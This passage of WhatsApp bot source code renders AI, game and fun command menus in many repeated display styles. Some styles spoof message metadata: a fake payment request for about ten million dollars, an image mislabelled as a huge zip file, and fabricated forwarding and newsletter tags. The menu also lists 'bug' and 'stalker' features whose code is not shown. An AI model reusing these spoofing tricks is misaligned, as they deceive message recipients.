                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Developer 👁️\",\"url\":\"https://wa.me/+2347082664317\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VajIDgjDZ4LVnxfB1Z2s\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 🔖","id":"${prefix}script"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, { quoted: m })
      
      await VeranBotInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"LIST MENU 📃",
"sections":[{"title":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"click to display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"},
{"header":"SEARCH MENU",
"title":"click to display",
"description":"Displays The List Of Search Features",
"id":"${prefix}searchmenu"},
{"header":"DOWNLOAD MENU",
"title":"click to display",
"description":"Displays The List Of Download Features",
"id":"${prefix}downloadmenu"},
{"header":"GAME MENU",
"title":"click to display",
"description":"Displays The List Of Game Features",
"id":"${prefix}gamemenu"},
{"header":"FUN MENU",
"title":"click to display",
"description":"Displays The List Of Fun Features",
"id":"${prefix}funmenu"},
{"header":"AI MENU",
"title":"click to display",
"description":"Displays The List Of AI Features",
"id":"${prefix}aimenu"},
{"header":"GROUP MENU",
"title":"click to display",
"description":"Displays The List Of Group Features",
"id":"${prefix}groupmenu"},
{"header":"OWNER MENU",
"title":"click to display",
"description":"Displays The List Of Owner Features",
"id":"${prefix}ownermenu"},
{"header":"CONVERT MENU",
"title":"click to display",
"description":"Displays The List Of Convert Features",
"id":"${prefix}convertmenu"},
{"header":"LIST MENU",
"title":"click to display",
"description":"Displays The List Of List Features",
"id":"${prefix}listmenu"},
{"header":"RELIGION MENU",
"title":"click to display",
"description":"Displays The List Of Religion Features",
"id":"${prefix}religionmenu"},
{"header":"ANIME MENU",
"title":"click to display",
"description":"Displays The List Of Anime Features",
"id":"${prefix}animemenu"},
{"header":"RANDOM PHOTO MENU",
"title":"click to display",
"description":"Displays The List Of Random Photo Features",
"id":"${prefix}randomphotomenu"},
{"header":"RANDOM VIDEO MENU",
"title":"click to display",
"description":"Displays The List Of Random Video Features",
"id":"${prefix}randomvideomenu"},
{"header":"STICKER MENU",
"title":"click to display",
"description":"Displays The List Of Sticker Features",
"id":"${prefix}stickermenu"},
{"header":"DATABASE MENU",
"title":"click to display",
"description":"Displays The List Of Database Features",
"id":"${prefix}databasemenu"},
{"header":"STORE MENU",
"title":"click to display",
"description":"Displays The List Of Store Features",
"id":"${prefix}storemenu"},
{"header":"STALKER MENU",
"title":"click to display",
"description":"Displays The List Of Stalk Features",
"id":"${prefix}stalkermenu"},
{"header":"BUG MENU",
"title":"click to display",
"description":"Displays The List Of Bug Features",
"id":"${prefix}bugmenu"},
{"header":"OTHER MENU",
"title":"click to display",
"description":"Displays The List Of Other Features",
"id":"${prefix}othermenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"CHANNEL 👥\",\"url\":\"https://whatsapp.com/channel/0029VajIDgjDZ4LVnxfB1Z2s\",\"merchant_url\":\"https://www.google.com\"}"
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await VeranBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'aimenu': {
let xmenu_oh = `
╭──❍「 *GREETING* 」❍
├ *Hi 👋*
├ *${m.pushName}* 
├ *${veranytimewisher} 😄* 
╰─┬────❍ ${readmore}
╭─┴❍「 *GUIDE* 」❍
├ *✓ = For Owner* 
├ *√ = For Free User*
├ *√ = For Premium User*
╰─┬────❍
╭─┴❍「 *OpenAI* 」❍
│${setv} ${prefix}*blackboxai√*
│${setv} ${prefix}*travel-assistant√*
│${setv} ${prefix}*guru-ai√*
│${setv} ${prefix}*emi-ai√*
│${setv} ${prefix}*claude-ai√*
│${setv} ${prefix}*hercai-cartoon√*
│${setv} ${prefix}*hercai-animefy√*
│${setv} ${prefix}*hercai-lexica√*
│${setv} ${prefix}*hercai-prodia√*
│${setv} ${prefix}*hercai-simurg√*
│${setv} ${prefix}*hercai-raava√*
│${setv} ${prefix}*hercai-shonin√*
│${setv} ${prefix}*realistic√*
│${setv} ${prefix}*3dmodel√*
│${setv} ${prefix}*photoleap√*
│${setv} ${prefix}*chatgpt4√*
│${setv} ${prefix}*mathsai√*
│${setv} ${prefix}*openai√*
│${setv} ${prefix}*dalle√*
│${setv} ${prefix}*ai√*
│${setv} ${prefix}*remini√*
│${setv} ${prefix}*bing√*
│${setv} ${prefix}*darky√*
│${setv} ${prefix}*checkgpt√*
╰──────❍`
if (typemenu === 'v1') {
                    VeranBotInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./VTHmedia/theme/VthPic.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    VeranBotInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./VTHmedia/theme/VthPic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    VeranBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./VTHmedia/theme/Vth-Video.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    VeranBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./VTHmedia/theme/Vth-Video.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    VeranBotInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, { quoted: m })
                } else if (typemenu === 'v6') {
                    VeranBotInc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'USD',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, { quoted: m })
                } else if (typemenu === 'v7') {
                    VeranBotInc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./VTHmedia/theme/VthPic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	VeranBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./VTHmedia/theme/Vth-Video.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.imgur.com/Zq10UP8.jpeg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v9') {
                	VeranBotInc.sendMessage(m.chat, {
video: fs.readFileSync('./VTHmedia/theme/Vth-Video.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "100000000000000000@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.imgur.com/Zq10UP8.jpeg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Developer 👁️\",\"url\":\"https://wa.me/+2347082664317\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VajIDgjDZ4LVnxfB1Z2s\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          })
        })
    }
  }
}, { quoted: m })

await VeranBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Developer 👁️\",\"url\":\"https://wa.me/+2347082664317\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VajIDgjDZ4LVnxfB1Z2s\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 🔖","id":"${prefix}script"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, { quoted: m })
      
      await VeranBotInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"LIST MENU 📃",
"sections":[{"title":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"click to display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"},
{"header":"SEARCH MENU",
"title":"click to display",
"description":"Displays The List Of Search Features",
"id":"${prefix}searchmenu"},
{"header":"DOWNLOAD MENU",
"title":"click to display",
"description":"Displays The List Of Download Features",
"id":"${prefix}downloadmenu"},
{"header":"GAME MENU",
"title":"click to display",
"description":"Displays The List Of Game Features",
"id":"${prefix}gamemenu"},
{"header":"FUN MENU",
"title":"click to display",
"description":"Displays The List Of Fun Features",
"id":"${prefix}funmenu"},
{"header":"AI MENU",
"title":"click to display",
"description":"Displays The List Of AI Features",
"id":"${prefix}aimenu"},
{"header":"GROUP MENU",
"title":"click to display",
"description":"Displays The List Of Group Features",
"id":"${prefix}groupmenu"},
{"header":"OWNER MENU",
"title":"click to display",
"description":"Displays The List Of Owner Features",
"id":"${prefix}ownermenu"},
{"header":"CONVERT MENU",
"title":"click to display",
"description":"Displays The List Of Convert Features",
"id":"${prefix}convertmenu"},
{"header":"LIST MENU",
"title":"click to display",
"description":"Displays The List Of List Features",
"id":"${prefix}listmenu"},
{"header":"RELIGION MENU",
"title":"click to display",
"description":"Displays The List Of Religion Features",
"id":"${prefix}religionmenu"},
{"header":"ANIME MENU",
"title":"click to display",
"description":"Displays The List Of Anime Features",
"id":"${prefix}animemenu"},
{"header":"RANDOM PHOTO MENU",
"title":"click to display",
"description":"Displays The List Of Random Photo Features",
"id":"${prefix}randomphotomenu"},
{"header":"RANDOM VIDEO MENU",
"title":"click to display",
"description":"Displays The List Of Random Video Features",
"id":"${prefix}randomvideomenu"},
{"header":"STICKER MENU",
"title":"click to display",
"description":"Displays The List Of Sticker Features",
"id":"${prefix}stickermenu"},
{"header":"DATABASE MENU",
"title":"click to display",
"description":"Displays The List Of Database Features",
"id":"${prefix}databasemenu"},
{"header":"STORE MENU",
"title":"click to display",
"description":"Displays The List Of Store Features",
"id":"${prefix}storemenu"},
{"header":"STALKER MENU",
"title":"click to display",
"description":"Displays The List Of Stalk Features",
"id":"${prefix}stalkermenu"},
{"header":"BUG MENU",
"title":"click to display",
"description":"Displays The List Of Bug Features",
"id":"${prefix}bugmenu"},
{"header":"OTHER MENU",
"title":"click to display",
"description":"Displays The List Of Other Features",
"id":"${prefix}othermenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"CHANNEL 👥\",\"url\":\"https://whatsapp.com/channel/0029VajIDgjDZ4LVnxfB1Z2s\",\"merchant_url\":\"https://www.google.com\"}"
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await VeranBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'gamemenu': {
let xmenu_oh = `
╭──❍「 *GREETING* 」❍
├ *Hi 👋*
├ *${m.pushName}* 
├ *${veranytimewisher} 😄* 
╰─┬────❍ ${readmore}
╭─┴❍「 *GUIDE* 」❍
├ *✓ = For Owner* 
├ *√ = For Free User*
├ *√ = For Premium User*
╰─┬────❍
╭─┴❍「 *Game* 」❍
│${setv} ${prefix}*truth√*
│${setv} ${prefix}*dare√*
│${setv} ${prefix}*suit√*
│${setv} ${prefix}*tictactoe√*
│${setv} ${prefix}*math√*
│${setv} ${prefix}*playbomb√*
│${setv} ${prefix}*casino√*
│${setv} ${prefix}*rob√*
│${setv} ${prefix}*slot√*
│${setv} ${prefix}*dice√*
│${setv} ${prefix}*profile√*
│${setv} ${prefix}*claim√*
│${setv} ${prefix}*tmoney√*
│${setv} ${prefix}*tflimit√*
╰──────❍`
if (typemenu === 'v1') {
                    VeranBotInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./VTHmedia/theme/VthPic.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    VeranBotInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./VTHmedia/theme/VthPic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    VeranBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./VTHmedia/theme/Vth-Video.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    VeranBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./VTHmedia/theme/Vth-Video.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    VeranBotInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, { quoted: m })
                } else if (typemenu === 'v6') {
                    VeranBotInc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'USD',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, { quoted: m })
                } else if (typemenu === 'v7') {
                    VeranBotInc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./VTHmedia/theme/VthPic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	VeranBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./VTHmedia/theme/Vth-Video.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.imgur.com/EGYRz3H.jpeg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v9') {
                	VeranBotInc.sendMessage(m.chat, {
video: fs.readFileSync('./VTHmedia/theme/Vth-Video.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "100000000000000000@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.imgur.com/EGYRz3H.jpeg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Developer 👁️\",\"url\":\"https://wa.me/+2347082664317\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VajIDgjDZ4LVnxfB1Z2s\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          })
        })
    }
  }
}, { quoted: m })

await VeranBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Developer 👁️\",\"url\":\"https://wa.me/+2347082664317\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VajIDgjDZ4LVnxfB1Z2s\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 🔖","id":"${prefix}script"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, { quoted: m })
      
      await VeranBotInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"LIST MENU 📃",
"sections":[{"title":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"click to display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"},
{"header":"SEARCH MENU",
"title":"click to display",
"description":"Displays The List Of Search Features",
"id":"${prefix}searchmenu"},
{"header":"DOWNLOAD MENU",
"title":"click to display",
"description":"Displays The List Of Download Features",
"id":"${prefix}downloadmenu"},
{"header":"GAME MENU",
"title":"click to display",
"description":"Displays The List Of Game Features",
"id":"${prefix}gamemenu"},
{"header":"FUN MENU",
"title":"click to display",
"description":"Displays The List Of Fun Features",
"id":"${prefix}funmenu"},
{"header":"AI MENU",
"title":"click to display",
"description":"Displays The List Of AI Features",
"id":"${prefix}aimenu"},
{"header":"GROUP MENU",
"title":"click to display",
"description":"Displays The List Of Group Features",
"id":"${prefix}groupmenu"},
{"header":"OWNER MENU",
"title":"click to display",
"description":"Displays The List Of Owner Features",
"id":"${prefix}ownermenu"},
{"header":"CONVERT MENU",
"title":"click to display",
"description":"Displays The List Of Convert Features",
"id":"${prefix}convertmenu"},
{"header":"LIST MENU",
"title":"click to display",
"description":"Displays The List Of List Features",
"id":"${prefix}listmenu"},
{"header":"RELIGION MENU",
"title":"click to display",
"description":"Displays The List Of Religion Features",
"id":"${prefix}religionmenu"},
{"header":"ANIME MENU",
"title":"click to display",
"description":"Displays The List Of Anime Features",
"id":"${prefix}animemenu"},
{"header":"RANDOM PHOTO MENU",
"title":"click to display",
"description":"Displays The List Of Random Photo Features",
"id":"${prefix}randomphotomenu"},
{"header":"RANDOM VIDEO MENU",
"title":"click to display",
"description":"Displays The List Of Random Video Features",
"id":"${prefix}randomvideomenu"},
{"header":"STICKER MENU",
"title":"click to display",
"description":"Displays The List Of Sticker Features",
"id":"${prefix}stickermenu"},
{"header":"DATABASE MENU",
"title":"click to display",
"description":"Displays The List Of Database Features",
"id":"${prefix}databasemenu"},
{"header":"STORE MENU",
"title":"click to display",
"description":"Displays The List Of Store Features",
"id":"${prefix}storemenu"},
{"header":"STALKER MENU",
"title":"click to display",
"description":"Displays The List Of Stalk Features",
"id":"${prefix}stalkermenu"},
{"header":"BUG MENU",
"title":"click to display",
"description":"Displays The List Of Bug Features",
"id":"${prefix}bugmenu"},
{"header":"OTHER MENU",
"title":"click to display",
"description":"Displays The List Of Other Features",
"id":"${prefix}othermenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"CHANNEL 👥\",\"url\":\"https://whatsapp.com/channel/0029VajIDgjDZ4LVnxfB1Z2s\",\"merchant_url\":\"https://www.google.com\"}"
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await VeranBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'funmenu': {
let xmenu_oh = `
╭──❍「 *GREETING* 」❍
├ *Hi 👋*
├ *${m.pushName}* 
├ *${veranytimewisher} 😄* 
╰─┬────❍ ${readmore}
╭─┴❍「 *GUIDE* 」❍
├ *✓ = For Owner* 
├ *√ = For Free User*
├ *√ = For Premium User*
╰─┬────❍
╭─┴❍「 *Fun* 」❍
│${setv} ${prefix}*define√*
│${setv} ${prefix}*readmore√*
│${setv} ${prefix}*yomamajoke√*
│${setv} ${prefix}*fact√*
│${setv} ${prefix}*couple√*
│${setv} ${prefix}*soulmate√*
│${setv} ${prefix}*stupidcheck√*
│${setv} ${prefix}*handsomecheck√*
│${setv} ${prefix}*uncleancheck√*
│${setv} ${prefix}*hotcheck√*
│${setv} ${prefix}*smartcheck√*
│${setv} ${prefix}*greatcheck√*
│${setv} ${prefix}*evilcheck√*
│${setv} ${prefix}*dogcheck√*
│${setv} ${prefix}*coolcheck√*
│${setv} ${prefix}*waifucheck√*
│${setv} ${prefix}*awesomecheck√*
│${setv} ${prefix}*gaycheck√*
│${setv} ${prefix}*cutecheck√*
│${setv} ${prefix}*lesbiancheck√*
│${setv} ${prefix}*hornycheck√*
│${setv} ${prefix}*prettycheck√*
│${setv} ${prefix}*lovelycheck√*
│${setv} ${prefix}*uglycheck√*
│${setv} ${prefix}*pick√*
│${setv} ${prefix}*pickupline√*
│${setv} ${prefix}*quotes√*
│${setv} ${prefix}*can√*
│${setv} ${prefix}*is√*
│${setv} ${prefix}*when√*
│${setv} ${prefix}*where√*
│${setv} ${prefix}*what√*
│${setv} ${prefix}*how√*
